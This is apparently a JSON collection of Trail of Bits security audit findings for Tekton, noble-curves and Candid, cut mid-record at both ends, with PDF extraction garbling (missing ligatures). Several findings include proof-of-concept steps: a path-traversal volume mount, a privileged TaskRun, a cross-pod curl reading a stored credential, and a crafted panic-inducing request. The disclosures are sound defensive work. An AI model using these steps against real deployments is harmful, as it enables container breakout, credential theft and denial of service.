./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature. 9. Insu\u0000cient default network access controls between pods Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-TKN-9 Target: Pipelines",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Lack of rate-limiting controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "Tekton Dashboard does not enforce rate limiting of HTTP requests. As a result, we were able to issue over a thousand requests in just over a minute. Figure 11.1: We sent over a thousand requests to Tekton Dashboard without being rate limited. Processing requests sent at such a high rate can consume an inordinate amount of resources, increasing the risk of denial-of-service attacks through excessive resource consumption. In particular, we were able to create hundreds of running import resources pods that were able to consume nearly all the hosts memory in the span of a minute. Exploit Scenario An attacker oods a Tekton Dashboard instance with HTTP requests that execute pipelines, leading to a denial-of-service condition. Recommendations Short term, implement rate limiting on all API endpoints. Long term, run stress tests to ensure that the rate limiting enforced by Tekton Dashboard is robust.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Lack of maximum request and response body constraint ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. This function is used in dierent les of the Tekton Triggers and Tekton Pipelines codebases to read requests and responses. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File pkg/remote/oci/resolver.go:L211 pkg/sink/sink.go:147,465 Project Pipelines Triggers pkg/interceptors/webhook/webhook.go:77 Triggers pkg/interceptors/interceptors.go:176 Triggers pkg/sink/validate_payload.go:29 cmd/binding-eval/cmd/root.go:141 cmd/triggerrun/cmd/root.go:182 Triggers Triggers Triggers Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limit can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of access controls for Tekton Pipelines API ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Insu\u0000cient validation of volumeMounts paths ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "The Tekton Pipelines extension performs a number of validations against task steps whenever a task is submitted for Tekton to process. One such validation veries that the path for a volume mount is not inside the /tekton directory. This directory is treated as a special directory by Tekton, as it is used for Tekton-specic functionality. However, the extension uses strings.HasPrefix to verify that MountPath does not contain the string /tekton/ without rst sanitizing it. As a result, it is possible to create volume mounts inside /tekton by using path traversal strings such as /somedir/../tekton/newdir in the volumeMounts variable of a task step denition. for j, vm := range s.VolumeMounts { if strings.HasPrefix(vm.MountPath, \"/tekton/\") && !strings.HasPrefix(vm.MountPath, \"/tekton/home\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(\"volumeMount cannot be mounted under /tekton/ (volumeMount %q mounted at %q)\", vm.Name, vm.MountPath), \"mountPath\").ViaFieldIndex(\"volumeMounts\", j)) } if strings.HasPrefix(vm.Name, \"tekton-internal-\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(`volumeMount name %q cannot start with \"tekton-internal-\"`, vm.Name), \"name\").ViaFieldIndex(\"volumeMounts\", j)) } } Figure 4.1: pipeline/pkg/apis/pipeline/v1beta1/task_validation.go#L218-L226 The YAML le in the gure below was used to create a volume in the reserved /tekton directory. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: vol-test spec: taskSpec: steps: - image: docker name: client workingDir: /workspace script: | #!/usr/bin/env sh sleep 15m volumeMounts: - mountPath: /certs/client/../../../tekton/mytest name: empty-path volumes: - name: empty-path emptyDir: {} Figure 4.2: Task run le used to create a volume mount inside an invalid location The gure below demonstrates that the previous le successfully created the mytest directory inside of the /tekton directory by using a path traversal string. $ kubectl exec -i -t vol-test -- /bin/sh Defaulted container \"step-client\" out of: step-client, place-tools (init), step-init (init), place-scripts (init) /workspace # cd /tekton/ /tekton # ls bin creds downward home scripts steps termination results run mytest Figure 4.3: Logging into the task pod container, we can now list the mytest directory inside of /tekton. Recommendations Short term, modify the code so that it converts the mountPath string into a le path and uses a function such as filepath.Clean to sanitize and canonicalize it before validating it.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Insu\u0000cient security hardening of step containers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "Containers used for running task and pipeline steps have excessive security context options enabled. This increases the attack surface of the system, and issues such as Linux kernel bugs may allow attackers to escape a container if they gain code execution within a Tekton container. The gure below shows the security properties of a task container with the docker driver. 0 0 0 0 0 0 cat 0 0 # cat /proc/self/status | egrep 'Name|Uid|Gid|Groups|Cap|NoNewPrivs|Seccomp' Name: Uid: Gid: Groups: CapInh: 00000000a80425fb CapPrm: 00000000a80425fb CapEff: 00000000a80425fb CapBnd: 00000000a80425fb CapAmb: 0000000000000000 NoNewPrivs: 0 0 Seccomp: Seccomp_filters: 0 Figure 7.1: The security properties of one of the step containers Exploit Scenario Eve nds a bug that allows her to run arbitrary code on behalf of a conned process within a container, using it to gain more privileges in the container and then to attack the host. Recommendations Short term, drop default capabilities from containers and prevent processes from gaining additional privileges by setting the --cap-drop=ALL and --security-opt=no-new-privileges:true ags when starting containers. Long term, review and implement the Kubernetes security recommendations in appendix C.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Tekton allows users to create privileged containers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled ./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Insu\u0000cient default network access controls between pods ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "By default, containers deployed as part of task steps do not have any egress or ingress network restrictions. As a result, containers could reach services exposed over the network from any task step container. For instance, in gure 9.2, a user logs into a container running a task step in the developer-group namespace and successfully makes a request to a service in a step container in the qa-group namespace. root@build-push-secret-35-pod:/# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.17.0.17 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:11 txqueuelen 0 (Ethernet) RX packets 21831 bytes 32563599 (32.5 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6465 bytes 362926 (362.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@build-push-secret-35-pod:/# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... 172.17.0.16 - - [08/Mar/2022 01:03:50] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - 172.17.0.16 - - [08/Mar/2022 01:04:05] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - Figure 9.1: Exposing a simple server in a step container in the developer-group namespace root@build-push-secret-35-pod:/# curl 172.17.0.17:8000/tekton/creds-secrets/basic-user-pass-canary/password mySUPERsecretPassword Figure 9.2: Reaching the service exposed in gure 9.1 from another container in the qa-group namespace Exploit Scenario An attacker launches a malicious task container that reaches a service exposed via a sidecar container and performs unauthorized actions against the service. Recommendations Short term, enforce ingress and egress restrictions to allow only resources that need to speak to each other to do so. Leverage allowlists instead of denylists to ensure that only expected components can establish these connections. Long term, ensure the use of appropriate methods of isolation to prevent lateral movement. 10. Import resources\" feature does not validate repository path Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-10 Target: Dashboard",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Nil dereferences in the trigger interceptor logic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf",
        "body": "The Process functions, which are responsible for executing the various triggers for the git, gitlab, bitbucket, and cel interceptors, do not properly validate request objects, leading to nil dereference panics when requests are submitted without a Context object. func (w *Interceptor) Process(ctx context.Context, r *triggersv1.InterceptorRequest) *triggersv1.InterceptorResponse { headers := interceptors.Canonical(r.Header) // (...) // Next validate secrets if p.SecretRef != nil { // Check the secret to see if it is empty if p.SecretRef.SecretKey == \"\" { interceptor secretRef.secretKey is empty\") return interceptors.Fail(codes.FailedPrecondition, \"github } // (...) ns, _ := triggersv1.ParseTriggerID(r.Context.TriggerID) Figure 13.1: triggers/pkg/interceptors/github/github.go#L48-L85 We tested the panic by forwarding the Tekton Triggers webhook server to localhost and sending HTTP requests to the GitHub endpoint. The Go HTTP server recovers from the panic. curl -i -s -k -X $'POST' \\ -H $'Host: 127.0.0.1:1934' -H $'Content-Length: 178' \\ --data-binary $'{\\x0d\\x0a\\\"header\\\":{\\x0d\\x0a\\\"X-Hub-Signature\\\":[\\x0d\\x0a\\x09\\\"sig\\\"\\x0d\\x0a],\\x0 d\\x0a\\\"X-GitHub-Event\\\":[\\x0d\\x0a\\\"evil\\\"\\x0d\\x0a]\\x0d\\x0a},\\x0d\\x0a\\\"interceptor_pa rams\\\": {\\x0d\\x0a\\x09\\\"secretRef\\\": {\\x0d\\x0a\\x09\\x09\\\"secretKey\\\":\\\"key\\\",\\x0d\\x0a\\x09\\x09\\\"secretName\\\":\\\"name\\\"\\x0d\\x 0a\\x09}\\x0d\\x0a}\\x0d\\x0a}' \\ $'http://127.0.0.1:1934/github' Figure 13.2: The curl request that causes a panic 2022/03/08 05:34:13 http: panic serving 127.0.0.1:49304: runtime error: invalid memory address or nil pointer dereference goroutine 33372 [running]: net/http.(*conn).serve.func1(0xc0001bf0e0) net/http/server.go:1824 +0x153 panic(0x1c25340, 0x30d6060) runtime/panic.go:971 +0x499 github.com/tektoncd/triggers/pkg/interceptors/github.(*Interceptor).Process(0xc00000 d248, 0x216fec8, 0xc0003d5020, 0xc0002b7b60, 0xc0000a7978) github.com/tektoncd/triggers/pkg/interceptors/github/github.go:85 +0x1f5 github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ExecuteInterceptor(0x c000491490, 0xc000280200, 0x0, 0x0, 0x0, 0x0, 0x0) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:128 +0x5df github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ServeHTTP(0xc00049149 0, 0x2166dc0, 0xc0000d42a0, 0xc000280200) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:57 +0x4d net/http.(*ServeMux).ServeHTTP(0xc00042d000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2448 +0x1ad net/http.serverHandler.ServeHTTP(0xc0000d4000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2887 +0xa3 net/http.(*conn).serve(0xc0001bf0e0, 0x216ff00, 0xc00042d200) net/http/server.go:1952 +0x8cd created by net/http.(*Server).Serve net/http/server.go:3013 +0x39b Figure 13.3: Panic trace Exploit Scenario As the codebase continues to grow, a new mechanism is added to call one of the Process functions without relying on HTTP requests (for instance, via a custom RPC client implementation). An attacker uses this mechanism to create a new interceptor. He calls the Process function with an invalid object, causing a panic that crashes the Tekton Triggers webhook server. Recommendations Short term, add checks to verify that request Context objects are not nil before dereferencing them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Timing issues ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-ryanshea-noblecurveslibrary-securityreview.pdf",
        "body": "The library provides a scalar multiplication routine that aims to keep the number of BigInteger operations constant, in order to be (close to) constant-time. However, there are some locations in the implementation where timing dierences can cause issues:    Pre-computed point look-up during scalar multiplication (gure 1.1) Second part of signature generation Tonelli-Shanks square root computation // Check if we're onto Zero point. // Add random point inside current window to f. const offset1 = offset; const offset2 = offset + Math .abs(wbits) - 1 ; // -1 because we skip zero const cond1 = window % 2 !== 0 ; const cond2 = wbits < 0 ; if (wbits === 0 ) { // The most important part for const-time getPublicKey f = f.add(constTimeNegate(cond1, precomputes[offset1])); } else { p = p.add(constTimeNegate(cond2, precomputes[offset2])); } Figure 1.1: Pre-computed point lookup during scalar multiplication ( noble-curves/src/abstract/curve.ts:117128 ) The scalar multiplication routine comprises a loop, part of which is shown in Figure 1.1. Each iteration adds a selected pre-computed point to the accumulator p (or to the dummy accumulator f if relevant scalar bits are all zero). However, the array access to select the appropriate pre-computed point is not constant-time. Figure 1.2 shows how the implementation computes the second half of an ECDSA signature. 14 noble-curves Security Assessment const s = modN(ik * modN(m + modN(d * r))); // s = k^-1(m + rd) mod n Figure 1.2: Generation of the second part of the signature ( noble-curves/src/abstract/weierstrass.ts:988 ) First, the private key is multiplied by the rst half of the signature and reduced modulo the group order. Next, the message digest is added and the result is again reduced modulo the group order. If the modulo operation is not constant-time, and if an attacker can detect this timing dierence, they can perform a lattice attack to recover the signing key. The details of this attack are described in the TCHES 2019 article by Ryan . Note that the article does not show that this timing dierence attack can be practically exploited, but instead mounts a cache-timing attack to exploit it. FpSqrt is a function that computes square roots of quadratic residues over  . Based on   , this function chooses one of several sub-algorithms, including  the value of Tonelli-Shanks. Some of these algorithms are constant-time with respect to , but some are not. In particular, the implementation of the Tonelli-Shanks algorithm has a high degree of timing variability. The FpSqrt function is used to decode compressed point representations, so it can inuence timing when handling potentially sensitive or adversarial data. Most texts consider Tonelli-Shanks the fallback algorithm when a faster or simpler algorithm is unavailable. However, Tonelli-Shanks can be used for any prime modulus Further, Tonelli-Shanks can be made constant time for a given value of  .  . Timing leakage threats can be reduced by modifying the Tonelli-Shanks code to run in constant time (see here ), and making the constant-time implementation the default square root algorithm. Special-case algorithms can be broken out into separate functions (whether constant- or variable-time), for use when the modulus is known to work, or timing attacks are not a concern. Exploit Scenario An attacker interacts with a user of the library and measures the time it takes to execute signature generation or ECDH key exchange. In the case of static ECDH, the attacker may provide dierent public keys to be multiplied with the static private key of the library user. In the case of ECDSA, the attacker may get the user to repeatedly sign the same message, which results in scalar multiplications on the base point using the same deterministically generated nonce. The attacker can subsequently average the obtained execution times for operations with the same input to gain more precise timing estimates. Then, the attacker uses the obtained execution times to mount a timing attack: 15 noble-curves Security Assessment   In the case of ECDSA, the attacker may attempt to mount the attack from the TCHES 2019 article by Ryan . However, it is unknown whether this attack will work in practice when based purely on timing. In the case of static ECDH, the attacker may attempt to mount a recursive attack, similar to the attacks described in the Cardis 1998 article by Dhem et al. or the JoCE 2013 article by Danger et al. Note that the timing dierences caused by the precomputed point look-up may not be sucient to mount such a timing attack. The attacker would need to nd other timing dierences, such as dierences in the point addition routines based on one of the input points. The fact that the library uses a complete addition formula increases the diculty, but there could still be timing dierences caused by the underlying big integer arithmetic. Determining whether such timing attacks are practically applicable to the library (and how many executions they would need) requires a large number of measurements on a dedicated benchmarking system, which was not done as part of this engagement. Recommendations Short term, consider adding scalar randomization to primitives where the same private scalar can be used multiple times, such as ECDH and deterministic ECDSA. To mitigate the attack from the TCHES 2019 article by Ryan , consider either blinding the private scalar in the signature computation or removing the modular reduction of  =  (  *  (  +  *  )) , i.e.,     . Long term, ensure that all low-level operations are constant-time. References    Return of the Hidden Number Problem, Ryan, TCHES 2019 A Practical Implementation of the Timing Attack, Dhem et al., Cardis 1998 A synthesis of side-channel attacks on elliptic curve cryptography in smart-cards, Danger et al., JoCE 2013 16 noble-curves Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Unmaintained dependency in candid_parser ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The candid_parser package relies on serde_dhall , whose README contains the following message: STATUS I am no longer maintaining this project. I got it to support about 90% of the language but then lost faith in the usability of dhall for my purposes. I am willing to hand this over to someone who's excited about dhall and rust. Note that this nding is informational because candid_parser is outside of the audits scope. Exploit Scenario Eve learns of a vulnerability in serde_dhall . Because the package is unmaintained, the vulnerability persists. Eve exploits the vulnerability in candid , knowing that it relies on serde_dhall . Recommendations Short term, adopt one of the following three strategies:    Deprecate support for the dhall format. Seek an alternative implementation of serde_dhall s functionality. (We were unable to nd one.) Take ownership of serde_dhall . Taking one of these steps will eliminate candid_parser s current reliance on an unmaintained dependency. Long term, regularly run cargo-audit and cargo upgrade --incompatible . Doing so will help ensure that the project stays up to date with its dependencies. 2. Insu\u0000cient linter use Severity: Informational Diculty: High Type: Patching Finding ID: TOB-CANDID-2 Target: Various source les",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Imprecise errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The candid package has a catch all, Custom error variant that is overused. Using more precise error variants would make it easier for clients to know and act on errors that can occur in the candid package. The candid packages error type appears in gure 3.1. Note that it contains only two specic error variants, Binread and Subtype . Errors that do not fall into one of these two categories must be returned as a Custom error. 15 16 17 #[derive(Debug, Error)] pub enum Error { #[error( \"binary parser error: {}\" , .0.get(0).map(|f| format!( \"{} at byte offset {}\" , f.message, f.pos/2)).unwrap_or_else(|| \"io error\" .to_string()))] 18 19 20 21 22 23 24 25 } Binread( Vec <Label>), #[error( \"Subtyping error: {0}\" )] Subtype( String ), #[error(transparent)] Custom( #[from] anyhow::Error), Figure 3.1: The candid packages error type ( candid/rust/candid/src/error.rs#1525 ) Error has an associated msg function that wraps a string in an anyhow::Error , and returns it in a Custom error. Example uses of the msg function appear in gure 3.2. As the gure shows, IO errors and errors related to integer parsing are turned into Custom errors using the msg function. It would be better to give such errors their own variants, similar to Binread and Subtype . 119 120 121 122 123 } 124 125 impl From <io::Error> for Error { fn from (e: io ::Error) -> Error { Error::msg( format! ( \"io error: {e}\" )) } impl From <binread::Error> for Error { 126 127 128 129 } 130 131 132 133 134 135 } fn from (e: binread ::Error) -> Error { Error::Binread(get_binread_labels(&e)) } impl From <ParseIntError> for Error { fn from (e: ParseIntError ) -> Error { Error::msg( format! ( \"ParseIntError: {e}\" )) } Figure 3.2: Example uses of Error::msg ( candid/rust/candid/src/error.rs#119135 ) Exploit Scenario Alice writes code that uses candid as a dependency. A catastrophic error occurs in candid . The error is bubbled up to Alices code as a Custom error. Alices code ignores the error, not knowing that it is one of the possible Custom errors. Recommendations Short term, use catch all error types (like Custom ) sparingly. Prefer to use variants that communicate the type of the error that occurred. For example, the uses of Error::msg in gure 3.2 could be given their own error variants, analogous to Error::Binread in the same gure. Taking these steps will make it easier for clients to know the types of errors that can occur, and to act on them. Long term, review all uses of with_context . This method adds information to an error, but as a string (i.e., unstructured data). It may be preferable to present such data to clients in struct elds.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Unnecessary recursion ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The candid package contains a recursive function, TypeEnv::rec_find_type (gure 4.1), that could be rewritten to use iteration. Using recursion unnecessarily makes a program vulnerable to a stack overow. 44 45 46 47 48 49 50 } pub fn rec_find_type (& self , name: &str ) -> Result <&Type> { let t = self .find_type(name)?; match t.as_ref() { TypeInner::Var(id) => self .rec_find_type(id), _ => Ok (t), } Figure 4.1: Denition of TypeEnv::rec_find_type ( candid/rust/candid/src/types/type_env.rs#4450 ) Also note that the function does not protect against innite loops/recursion. The function could do so by, for example, storing the hash of each name processed in a set, and consulting the set before iterating/recursing. We observed stack overows in TypeEnv::rec_find_type while fuzzing. However, we have not yet determined whether those stack overows would be prevented by checks performed in TypeEnv::rec_find_type s callers. Exploit Scenario Alice writes a program that uses the candid library. Eve discovers a bug that allows her to map a candid type variable to itself. Eve triggers the bug in Alices program, causing it to overow its stack and crash. Recommendations Short term, take the following steps:   Rewrite TypeEnv::rec_find_type to use iteration instead of recursion. Add protection from innite loops by, for example, storing the hash of each name processed in a set. Taking these steps will help protect candid clients against denial-of-service attacks. Long term, fuzz the candid packages functions regularly. This issue was found through fuzzing. Fuzzing regularly could help to expose similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "5. The IDL allows for recursive cyclic types which should not be allowed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "While the Candid specication states that type cycles must be productive (gure 5.1), it is possible to create a record type with a cyclic reference to itself, thus making it a non-productive type. An example of a self-referential type is shown in gure 5.2. Additionally, if one uses the didc tool to generate a random value of such a type, the tool crashes due to a stack overow (as shown in gure 5.3), since it tries to create an innitely long cycle of references. Type definitions are mutually recursive, i.e., they can refer to themselves or each other. However, every type cycle must be productive, i.e., go through a type expression that is not just an identifier. A type definition that is vacuous, i.e., is only equal to itself, is not allowed. Figure 5.1: Excerpt from the Candid IDL specication type A = record { a : A }; service : { test : (A) -> (int32) query } Figure 5.2: An example IDL le that denes a non-productive recursive type cycle $ ./target/debug/didc random -d ./example.did -t '(A)' thread 'main' has overflowed its stack fatal runtime error: stack overflow [1] 34219 abort ./target/debug/didc random -d ./example.did -t '(A)' Figure 5.3: Crash of the didc tool when we try to randomize a value of the A type dened in gure 5.2 Recommendations Short term, change the Candid implementation so that it disallows the creation of record types with non-optional cycles to themselves (also consider longer cycles like A->B->C->A). The compiler could suggest that the cycle be xed by specifying an optional reference, since it would be possible to create instances of such types. For example, the type from gure 5.2 could be xed as: type A = record { a : opt A }; .",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "6. Stack overow in encoding/serialization path ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "Encoding a long record cycle causes recursive calls that lead to a stack overow, which causes the Encode! function to crash. This may lead to denial of service for programs that serialize user data using Candid into types that contain cycles. Figure 6.1 shows example test code that triggers this case. Also note that Candid performs stack exhaustion checks via the check_recursion! macro , but while it is used in the Decode! functionality, it is missing from the Encode! path. #[test] fn test_recursive_type_encoding () { #[derive(Debug, CandidType, Deserialize)] struct A { a: Box < Option <A>>, } let mut data = A { a: Box ::new( None ) }; for _ in 0 .. 5000 { data = A { a: Box ::new( Some (data)) }; } Encode!(&data).unwrap(); } Figure 6.1: Test that causes the Encode! function to crash due to a stack overow Running this test under a debug mode results in the following stack trace, shown in gure 6.2. Figure 6.2: Screenshot from RustRover IDE when the stack overow crash happens in the test from gure 6.1. Test run on MacOS. Exploit Scenario A web service uses Candid to serialize data sent as JSON into a record type with cyclic reference. An attacker leverages this fact and sends a JSON with a big linked structure causing the web service to crash. Recommendations Short term, x the stack overow crash in the Encode! functionality. This can be done either by adding the check_recursion! checks to the encoding code paths, or by changing the encoding algorithm to use loops instead of recursion (although this would not be trivial). Long term, add the test from gure 6.1 to the Candid types tests and change it so it expects that the Encode! call errors out with a Recursion limit exceeded at depth X error (in case the code is xed by adding the recursion checks mentioned in the short-term recommendation).",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. The fuzzing harnesses do not build ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The fuzzing harnesses available in the candid/rust/candid/fuzz directory are not building in the audited codebase. One of the reasons for this is that the candid-fuzz crate refers to a non-existent feature called parser of the candid crate (gure 7.1). features = [ \"parser\" ] Figure 7.1: candid-fuzz s reference to the non-existent candid parser feature ( candid/rust/candid/fuzz/Cargo.toml#18 ) Recommendations Short term, x the fuzzing harnesses so they build properly. Long term, run the fuzzing harnesses regularly, at least before each new release of the Candid project.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "8. The oat32/oat64 innite signs are displayed incorrectly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf",
        "body": "The Candid's fmt::Debug trait implementation for its IDLValue type displays the +inf and -inf values of its oat types ( float32 and float64 ) by appending a .0 to them, which seems unexpected and incorrect. This can be conrmed with the test from gure 8.1. #[test] fn test_floats_inf () { let f: f32 = \"inf\" .parse().unwrap(); // Note: A valid test after the bug is fixed should not include the \".0\" part assert_eq! ( format! ( \"{:?}\" , IDLValue::Float32(f)), \"inf.0 : float32\" ); let f: f32 = \"-inf\" .parse().unwrap(); // Note: A valid test after the bug is fixed should not include the \".0\" part assert_eq! ( format! ( \"{:?}\" , IDLValue::Float32(f)), \"-inf.0 : float32\" ); } Figure 8.1: An example test that shows how +inf and -inf oats are displayed This issue is caused by the f.trunc() path in the number_to_string function (gure 8.2). pub fn number_to_string (v: & IDLValue ) -> String { match v { ... Float32(f) => { if f.trunc() == *f { format! ( \"{f}.0\" ) } else { f.to_string() } } Float64(f) => { if f.trunc() == *f { format! ( \"{f}.0\" ) } else { f.to_string() } Figure 8.2: The number_to_string function ( candid/rust/candid/src/pretty/candid.rs#L297L310 ) Additionally, the didc tool cannot encode special oat values ( +inf , -inf , and NaN ), neither with the .0 sux nor without it, as shown in gure 8.3. $ ./target/debug/didc encode -t '(float32)' '(inf : float32)' error: parser error  candid arguments:1:2  1  (inf : float32)  ^^^ Unexpected token  = Expects one of \"(\", \")\", \"blob\", \"bool\", \"decimal\", \"float\", \"func\", \"hex\", \"null\", \"opt\", \"principal\", \"record\", \"service\", \"sign\", \"text\", \"variant\", \"vec\" error: invalid value '(inf : float32)' for '[ARGS]': Candid parser error: Unrecognized token `Id(\"inf\")` found at 1:4 Expected one of \"(\", \")\", \"blob\", \"bool\", \"decimal\", \"float\", \"func\", \"hex\", \"null\", \"opt\", \"principal\", \"record\", \"service\", \"sign\", \"text\", \"variant\" or \"vec\" For more information, try '--help'. $ ./target/debug/didc encode -t '(float32)' '(inf.0 : float32)' error: parser error  candid arguments:1:2  1  (inf.0 : float32)  ^^^ Unexpected token  = Expects one of \"(\", \")\", \"blob\", \"bool\", \"decimal\", \"float\", \"func\", \"hex\", \"null\", \"opt\", \"principal\", \"record\", 